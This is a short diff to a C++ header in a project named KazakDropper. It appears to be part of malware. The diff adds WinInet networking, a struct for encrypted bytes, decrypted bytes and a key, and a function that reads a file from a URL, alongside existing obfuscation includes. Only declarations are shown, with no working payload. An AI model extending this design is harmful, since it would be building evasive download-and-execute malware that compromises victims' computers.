@@ -5,11 +5,20 @@
 #include <iostream>
 #include <filesystem>
 #include <thread>
+#include <WinInet.h>
 
 #include "../headers/obfuscation/li.h"
 #include "../headers/obfuscation/xor.h"
 
+#pragma comment(lib,"WinInet.lib")
 
+struct Storage
+{
+	std::string DecryptedBytes;
+	std::string BytesStorage;
+	std::string Key;
+
+};
 
 namespace KazakDropper
 {
@@ -22,6 +31,5 @@ namespace KazakDropper
 
 namespace KazakUtils
 {
-	std::string replace_all(std::string subject, const std::string& search, const std::string& replace);
-	std::string StringWrapper(const std::string url);
+	std::string FileToString(std::wstring URL);
 }
